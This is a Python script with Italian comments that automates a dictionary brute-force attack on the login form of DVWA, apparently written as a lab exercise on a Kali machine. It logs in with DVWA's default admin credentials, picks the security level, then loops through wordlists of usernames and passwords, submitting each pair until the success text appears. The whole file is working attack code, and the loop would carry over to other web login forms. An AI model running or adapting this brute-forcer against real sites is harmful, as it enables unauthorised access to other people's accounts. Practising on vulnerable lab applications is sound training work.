import mechanicalsoup
import requests
import time
import re  # Importato per la validazione dell'URL e dell'IP

# Creazione di un browser automatizzato utilizzando mechanicalsoup.
browser = mechanicalsoup.StatefulBrowser()

# Funzioni di validazione
def validate_ip(ip):
    pattern = re.compile(r'^([0-9]{1,3}\.){3}[0-9]{1,3}$')
    return pattern.match(ip) is not None

def validate_url(url):
    return url.startswith("http://") or url.startswith("https://")

# Inizio della sezione per l'inserimento del percorso.
ip = input('Inserire IP target: ')
while not validate_ip(ip):
    print("IP non valido. Riprova.")
    ip = input('Inserire IP target: ')

print('Inserire un indirizzo, o premere "invio" per l\'indirizzo standard: ')
path = input("Indirizzo standard DVWA: dvwa/login.php: ")
if path == "":
    path = "dvwa/login.php"
elif not validate_url(f"http://{ip}/{path}"):
    print("URL non valido. Utilizzo dell'indirizzo standard.")
    path = "dvwa/login.php"

browser.open(f"http://{ip}/{path}")

# Inizio della sezione per accedere a DVWA.
browser.select_form('form[action="login.php"]')
browser["username"] = "admin"
browser["password"] = "password"
browser.submit_selected()

# Inizio della sezione per spostarsi in security.php e impostare il livello di sicurezza.
browser.follow_link("security.php")
print(browser.get_url())

scelta_valida = False
while not scelta_valida:
    print("Scegli il livello di sicurezza che vuoi usare per tentare attacco bruteforce sull'URL target:\nhttp://192.168.50.101/dvwa/vulnerabilities/brute/ ")
    print("1 = low; 2 = medium; 3 = high")
    scelta = input("Inserisci il livello di sicurezza: ")

    if scelta in ["1", "2", "3"]:
        scelta_valida = True
        if scelta == "1":
            browser.select_form('form[action="#"]')
            browser["security"] = "low"
        elif scelta == "2":
            browser.select_form('form[action="#"]')
            browser["security"] = "medium"
        elif scelta == "3":
            browser.select_form('form[action="#"]')
            browser["security"] = "high"
    else:
        print("Scelta non valida. Inserisci 1, 2 o 3.")

browser.submit_selected()
browser.follow_link("vulnerabilities/brute/")

# Inizio della configurazione dei dati.

username_file = input('Percorso file username (default: "/home/kali/Desktop/usernames.lst"): ')
username_file = username_file if username_file else "/home/kali/Desktop/usernames.lst"

password_file = input('Percorso file password (default: "/home/kali/Desktop/passwords.lst"): ')
password_file = password_file if password_file else "/home/kali/Desktop/passwords.lst"


# Inizio della routine di brute force.
def bf():
    start = time.time()
    with open(username_file) as f:
        usernames = f.read().splitlines()
    with open(password_file) as f:
        passwords = f.read().splitlines()

    for user in usernames:
        for password in passwords:
            print(f'{user} - {password}')
            browser.select_form('form[action="#"]')
            browser["username"] = user
            browser["password"] = password
            response = browser.submit_selected()

            if "Welcome to the password protected area" in response.text:
                print(f"Accesso riuscito con {user} - {password}")
                end = time.time()
                print(f'Tempo impiegato: {end-start:.2f} secondi')
                return
            else:
                browser.follow_link("vulnerabilities/brute/")

bf()
